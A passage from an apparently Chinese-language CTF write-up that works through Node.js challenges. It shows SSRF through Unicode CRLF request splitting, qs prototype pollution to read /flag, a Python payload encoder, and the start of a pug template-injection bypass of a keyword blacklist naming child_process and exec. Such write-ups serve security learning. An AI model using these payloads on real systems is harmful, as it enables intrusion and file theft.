</span></span><span style=display:flex><span>    <span style=color:#75af00>path</span><span style=color:#111>.</span><span style=color:#75af00>join</span><span style=color:#111>(</span> <span style=color:#75af00>__dirname</span><span style=color:#111>,</span>  <span style=color:#d88200>&#39;./tmp&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>))</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>use</span><span style=color:#111>(</span><span style=color:#75af00>bodyParser</span><span style=color:#111>())</span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>use</span><span style=color:#111>(</span><span style=color:#75af00>session</span><span style=color:#111>(</span><span style=color:#75af00>CONFIG</span><span style=color:#111>,</span> <span style=color:#75af00>app</span><span style=color:#111>));</span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>use</span><span style=color:#111>(</span><span style=color:#75af00>home</span><span style=color:#111>.</span><span style=color:#75af00>routes</span><span style=color:#111>()).</span><span style=color:#75af00>use</span><span style=color:#111>(</span><span style=color:#75af00>home</span><span style=color:#111>.</span><span style=color:#75af00>allowedMethods</span><span style=color:#111>());</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>listen</span><span style=color:#111>(</span><span style=color:#ae81ff>3000</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>&#39;[demo] start-quick is starting at port 3000&#39;</span><span style=color:#111>)</span>
</span></span></code></pre></div><p>唔，看起来要比其它的复杂不少，但是核心漏洞点是一样的；简单审一下代码</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206230457270.png alt=image-20211206230457270></p><p>只允许admin用户才可以加载其它的模板</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206230620584.png alt=image-20211206230620584></p><p>确实是<code>toUpperCase()</code>的问题，很轻松就用<code>admın</code>绕过了</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206231746702.png alt=image-20211206231746702></p><p>/request路由下的请求经过<code>CheckUrl</code>的检查</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206231939254.png alt=image-20211206231939254></p><p>必须开头是http://127.0.0.1:3000/query，没法绕过，需要SSRF；请求之后会被记录在sandbox的results.txt里面（追加的形式），sandbox根据ip建立</p><p>而恰好/query本身也是一个路由</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206232301967.png alt=image-20211206232301967></p><p>并且参数param比较好绕过，我们借助它来完成我们的攻击；接下来找利用点，看到/save路由</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206234720831.png alt=image-20211206234720831></p><p>简单的分析写在注释中了，138行用ssrf绕过，146行使用的qs库有<a href=https://security.snyk.io/vuln/npm:qs:20170213>原型链污染</a>的问题，传参<code>]=switch</code>即可绕过；154行的判断也需要绕过，原型链污染sandbox下的一个文件为<code>/flag</code>，再去自定义读到spath中</p><pre tabindex=0><code>tmp[&#39;__proto__&#39;][&#39;opath&#39;] = &#39;/flag&#39;;
=&gt;
paths.opath = /flag
</code></pre><p>payload</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>amiz HTTP/1.1
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Host: 127.0.0.1:3000
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Connection: keep-alive
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>GET /save?]=switch&amp;sandbox=__proto__&amp;opath=/flag&amp;spath=/app/tmp/c74e4def8b621891bc34c84bca9b2a76
</span></span></span></code></pre></div><pre tabindex=0><code>http://127.0.0.1:3000/query?param=1\u{0120}HTTP/1.1\u{010D}\u{010A}Host:\u{0120}127.0.0.1:3000\u{010D}\u{010A}Connection:\u{0120}keep-alive\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/\u{0173}\u{0161}\u{0176}\u{0165}?]=switch&amp;sandbox=__proto__&amp;opath=/flag&amp;spath=tmp/c74e4def8b621891bc34c84bca9b2a76
</code></pre><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211207020732089.png alt=image-20211207020732089></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211207001654270.png alt=image-20211207001654270></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211207002041861.png alt=image-20211207002041861></p><p>当然，用完全unicode编码也是可以的，亲测这个全编码容错率会高一丢丢</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> <span style=color:#111>requests.utils</span> <span style=color:#f92672>import</span> <span style=color:#111>quote</span>
</span></span><span style=display:flex><span><span style=color:#111>_payload</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;&#39;&#39;amiz HTTP/1.1
</span></span></span><span style=display:flex><span><span style=color:#d88200>Host: 127.0.0.1:3000
</span></span></span><span style=display:flex><span><span style=color:#d88200>Connection: keep-alive
</span></span></span><span style=display:flex><span><span style=color:#d88200>
</span></span></span><span style=display:flex><span><span style=color:#d88200>GET /save?]=switch&amp;sandbox=__proto__&amp;opath=/flag&amp;spath=/app/tmp/c74e4def8b621891bc34c84bca9b2a76&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#111>_payload</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#34;</span><span style=color:#8045ff>\n</span><span style=color:#d88200>&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;</span><span style=color:#8045ff>\r\n</span><span style=color:#d88200>&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;&#39;</span><span style=color:#f92672>.</span><span style=color:#111>join</span><span style=color:#111>(</span><span style=color:#111>chr</span><span style=color:#111>(</span><span style=color:#111>int</span><span style=color:#111>(</span><span style=color:#d88200>&#39;0xff&#39;</span> <span style=color:#f92672>+</span> <span style=color:#111>hex</span><span style=color:#111>(</span><span style=color:#111>ord</span><span style=color:#111>(</span><span style=color:#111>c</span><span style=color:#111>))[</span><span style=color:#ae81ff>2</span><span style=color:#111>:]</span><span style=color:#f92672>.</span><span style=color:#111>zfill</span><span style=color:#111>(</span><span style=color:#ae81ff>2</span><span style=color:#111>),</span> <span style=color:#ae81ff>16</span><span style=color:#111>))</span> <span style=color:#00a8c8>for</span> <span style=color:#111>c</span> <span style=color:#f92672>in</span> <span style=color:#111>payload</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>quote</span><span style=color:#111>(</span><span style=color:#111>payload</span><span style=color:#111>))</span>
</span></span></code></pre></div><h2 id=nullcon-hackim2020split-second>[nullcon HackIM2020]Split second</h2><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#75715e>//node 8.12.0
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#00a8c8>var</span> <span style=color:#75af00>express</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;express&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>app</span> <span style=color:#f92672>=</span> <span style=color:#75af00>express</span><span style=color:#111>();</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>fs</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;fs&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>path</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;path&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>http</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;http&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>pug</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;pug&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>req</span><span style=color:#111>,</span> <span style=color:#75af00>res</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>sendFile</span><span style=color:#111>(</span><span style=color:#75af00>path</span><span style=color:#111>.</span><span style=color:#75af00>join</span><span style=color:#111>(</span><span style=color:#75af00>__dirname</span> <span style=color:#f92672>+</span> <span style=color:#d88200>&#39;/index.html&#39;</span><span style=color:#111>));</span>
</span></span><span style=display:flex><span><span style=color:#111>});</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/source&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>req</span><span style=color:#111>,</span> <span style=color:#75af00>res</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>sendFile</span><span style=color:#111>(</span><span style=color:#75af00>path</span><span style=color:#111>.</span><span style=color:#75af00>join</span><span style=color:#111>(</span><span style=color:#75af00>__dirname</span> <span style=color:#f92672>+</span> <span style=color:#d88200>&#39;/source.html&#39;</span><span style=color:#111>));</span>
</span></span><span style=display:flex><span><span style=color:#111>});</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/getMeme&#39;</span><span style=color:#111>,</span><span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>req</span><span style=color:#111>,</span><span style=color:#75af00>res</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>   <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>send</span><span style=color:#111>(</span><span style=color:#d88200>&#39;&lt;iframe src=&#34;https://giphy.com/embed/LLHkw7UnvY3Kw&#34; width=&#34;480&#34; height=&#34;480&#34; frameBorder=&#34;0&#34; class=&#34;giphy-embed&#34; allowFullScreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href=&#34;https://giphy.com/gifs/kid-dances-jumbotron-LLHkw7UnvY3Kw&#34;&gt;via GIPHY&lt;/a&gt;&lt;/p&gt;&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>});</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/flag&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>req</span><span style=color:#111>,</span> <span style=color:#75af00>res</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>var</span> <span style=color:#75af00>ip</span> <span style=color:#f92672>=</span> <span style=color:#75af00>req</span><span style=color:#111>.</span><span style=color:#75af00>connection</span><span style=color:#111>.</span><span style=color:#75af00>remoteAddress</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>ip</span><span style=color:#111>.</span><span style=color:#75af00>includes</span><span style=color:#111>(</span><span style=color:#d88200>&#39;127.0.0.1&#39;</span><span style=color:#111>))</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>var</span> <span style=color:#75af00>authheader</span> <span style=color:#f92672>=</span> <span style=color:#75af00>req</span><span style=color:#111>.</span><span style=color:#75af00>headers</span><span style=color:#111>[</span><span style=color:#d88200>&#39;adminauth&#39;</span><span style=color:#111>];</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>var</span> <span style=color:#75af00>pug2</span> <span style=color:#f92672>=</span> <span style=color:#111>decodeURI</span><span style=color:#111>(</span><span style=color:#75af00>req</span><span style=color:#111>.</span><span style=color:#75af00>headers</span><span style=color:#111>[</span><span style=color:#d88200>&#39;pug&#39;</span><span style=color:#111>]);</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>var</span> <span style=color:#75af00>x</span><span style=color:#f92672>=</span><span style=color:#75af00>pug2</span><span style=color:#111>.</span><span style=color:#75af00>match</span><span style=color:#111>(</span><span style=color:#d88200>/[a-z]/g</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#f92672>!</span><span style=color:#75af00>x</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>         <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>authheader</span> <span style=color:#f92672>===</span> <span style=color:#d88200>&#34;secretpassword&#34;</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>var</span> <span style=color:#75af00>html</span> <span style=color:#f92672>=</span> <span style=color:#75af00>pug</span><span style=color:#111>.</span><span style=color:#75af00>render</span><span style=color:#111>(</span><span style=color:#75af00>pug2</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>         <span style=color:#111>}</span>
</span></span><span style=display:flex><span>        <span style=color:#111>}</span>
</span></span><span style=display:flex><span>       <span style=color:#00a8c8>else</span><span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>send</span><span style=color:#111>(</span><span style=color:#d88200>&#34;No characters&#34;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>      <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>else</span><span style=color:#111>{</span>
</span></span><span style=display:flex><span>     <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>send</span><span style=color:#111>(</span><span style=color:#d88200>&#34;You need to come from localhost&#34;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#111>});</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/core&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>req</span><span style=color:#111>,</span> <span style=color:#75af00>res</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>var</span> <span style=color:#75af00>q</span> <span style=color:#f92672>=</span> <span style=color:#75af00>req</span><span style=color:#111>.</span><span style=color:#75af00>query</span><span style=color:#111>.</span><span style=color:#75af00>q</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>var</span> <span style=color:#75af00>resp</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;&#34;</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>q</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>var</span> <span style=color:#75af00>url</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;http://localhost:8081/getMeme?&#39;</span> <span style=color:#f92672>+</span> <span style=color:#75af00>q</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>url</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>var</span> <span style=color:#75af00>trigger</span> <span style=color:#f92672>=</span> <span style=color:#75af00>blacklist</span><span style=color:#111>(</span><span style=color:#75af00>url</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>trigger</span> <span style=color:#f92672>===</span> <span style=color:#00a8c8>true</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>            <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>send</span><span style=color:#111>(</span><span style=color:#d88200>&#34;&lt;p&gt;Errrrr, You have been Blocked&lt;/p&gt;&#34;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>}</span> <span style=color:#00a8c8>else</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>try</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                <span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#75af00>url</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>resp</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                    <span style=color:#75af00>resp</span><span style=color:#111>.</span><span style=color:#75af00>setEncoding</span><span style=color:#111>(</span><span style=color:#d88200>&#39;utf8&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>                    <span style=color:#75af00>resp</span><span style=color:#111>.</span><span style=color:#75af00>on</span><span style=color:#111>(</span><span style=color:#d88200>&#39;error&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                    <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>.</span><span style=color:#75af00>code</span> <span style=color:#f92672>===</span> <span style=color:#d88200>&#34;ECONNRESET&#34;</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                     <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Timeout occurs&#34;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>                     <span style=color:#00a8c8>return</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>                    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>                   <span style=color:#111>});</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                    <span style=color:#75af00>resp</span><span style=color:#111>.</span><span style=color:#75af00>on</span><span style=color:#111>(</span><span style=color:#d88200>&#39;data&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>chunk</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                        <span style=color:#75af00>resps</span> <span style=color:#f92672>=</span> <span style=color:#75af00>chunk</span><span style=color:#111>.</span><span style=color:#75af00>toString</span><span style=color:#111>();</span>
</span></span><span style=display:flex><span>                        <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>send</span><span style=color:#111>(</span><span style=color:#75af00>resps</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>                    <span style=color:#111>}).</span><span style=color:#75af00>on</span><span style=color:#111>(</span><span style=color:#d88200>&#39;error&#39;</span><span style=color:#111>,</span> <span style=color:#111>(</span><span style=color:#75af00>e</span><span style=color:#111>)</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                         <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>send</span><span style=color:#111>(</span><span style=color:#75af00>e</span><span style=color:#111>.</span><span style=color:#75af00>message</span><span style=color:#111>);});</span>
</span></span><span style=display:flex><span>                <span style=color:#111>});</span>
</span></span><span style=display:flex><span>            <span style=color:#111>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#111>(</span><span style=color:#75af00>error</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>error</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>}</span>
</span></span><span style=display:flex><span>        <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span> <span style=color:#00a8c8>else</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>send</span><span style=color:#111>(</span><span style=color:#d88200>&#34;search param &#39;q&#39; missing!&#34;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#111>})</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>function</span> <span style=color:#75af00>blacklist</span><span style=color:#111>(</span><span style=color:#75af00>url</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>var</span> <span style=color:#75af00>evilwords</span> <span style=color:#f92672>=</span> <span style=color:#111>[</span><span style=color:#d88200>&#34;global&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;process&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;mainModule&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;require&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;root&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;child_process&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;exec&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;\&#34;&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;&#39;&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;!&#34;</span><span style=color:#111>];</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>var</span> <span style=color:#75af00>arrayLen</span> <span style=color:#f92672>=</span> <span style=color:#75af00>evilwords</span><span style=color:#111>.</span><span style=color:#75af00>length</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>for</span> <span style=color:#111>(</span><span style=color:#00a8c8>var</span> <span style=color:#75af00>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span><span style=color:#111>;</span> <span style=color:#75af00>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#75af00>arrayLen</span><span style=color:#111>;</span> <span style=color:#75af00>i</span><span style=color:#f92672>++</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>const</span> <span style=color:#75af00>trigger</span> <span style=color:#f92672>=</span> <span style=color:#75af00>url</span><span style=color:#111>.</span><span style=color:#75af00>includes</span><span style=color:#111>(</span><span style=color:#75af00>evilwords</span><span style=color:#111>[</span><span style=color:#75af00>i</span><span style=color:#111>]);</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>trigger</span> <span style=color:#f92672>===</span> <span style=color:#00a8c8>true</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>true</span>
</span></span><span style=display:flex><span>        <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>server</span> <span style=color:#f92672>=</span> <span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>listen</span><span style=color:#111>(</span><span style=color:#ae81ff>8081</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>()</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>var</span> <span style=color:#75af00>host</span> <span style=color:#f92672>=</span> <span style=color:#75af00>server</span><span style=color:#111>.</span><span style=color:#75af00>address</span><span style=color:#111>().</span><span style=color:#75af00>address</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>var</span> <span style=color:#75af00>port</span> <span style=color:#f92672>=</span> <span style=color:#75af00>server</span><span style=color:#111>.</span><span style=color:#75af00>address</span><span style=color:#111>().</span><span style=color:#75af00>port</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Example app listening at http://%s:%s&#34;</span><span style=color:#111>,</span> <span style=color:#75af00>host</span><span style=color:#111>,</span> <span style=color:#75af00>port</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>})</span>
</span></span></code></pre></div><p>如果上一个题仔细分析的话就会发现这个题只是代码做了一些微小的改动</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205214720894.png alt=image-20211205214720894></p><p>需要多构造一个请求头，换行的CRLF和空格SP我们用unicode，而pug执行命令的部分我们可以用八进制字符</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#111>[][</span><span style=color:#d88200>&#34;constructor&#34;</span><span style=color:#111>]</span>	<span style=color:#75715e>// valid
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>[][</span><span style=color:#d88200>&#34;constructor&#34;</span><span style=color:#111>][</span><span style=color:#d88200>&#34;constructor&#34;</span><span style=color:#111>](</span><span style=color:#d88200>&#34;evalcode&#34;</span><span style=color:#111>)()</span>
</span></span><span style=display:flex><span><span style=color:#111>[][</span><span style=color:#d88200>&#34;\143\157\156\163\164\162\165\143\164\157\162&#34;</span><span style=color:#111>]</span>	<span style=color:#75715e>// valid,executable
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>[][</span><span style=color:#960050;background-color:#1e0010>\</span><span style=color:#ae81ff>42</span><span style=color:#960050;background-color:#1e0010>\</span><span style=color:#ae81ff>143</span><span style=color:#960050;background-color:#1e0010>\</span><span style=color:#ae81ff>157</span><span style=color:#960050;background-color:#1e0010>\</span><span style=color:#ae81ff>156</span><span style=color:#960050;background-color:#1e0010>\</span><span style=color:#ae81ff>163</span><span style=color:#960050;background-color:#1e0010>\</span><span style=color:#ae81ff>164</span><span style=color:#960050;background-color:#1e0010>\</span><span style=color:#ae81ff>162</span><span style=color:#960050;background-color:#1e0010>\</span><span style=color:#ae81ff>165</span><span style=color:#960050;background-color:#1e0010>\</span><span style=color:#ae81ff>143</span><span style=color:#960050;background-color:#1e0010>\</span><span style=color:#ae81ff>164</span><span style=color:#960050;background-color:#1e0010>\</span><span style=color:#ae81ff>157</span><span style=color:#960050;background-color:#1e0010>\</span><span style=color:#ae81ff>162</span><span style=color:#960050;background-color:#1e0010>\</span><span style=color:#ae81ff>42</span><span style=color:#111>]</span>	<span style=color:#75715e>// invalid,since &#34; is encoded
</span></span></span></code></pre></div><p>pug模板两种形式</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>#</span><span style=color:#111>{</span><span style=color:#75af00>shellcode</span><span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>-</span> <span style=color:#75af00>shellcode</span>
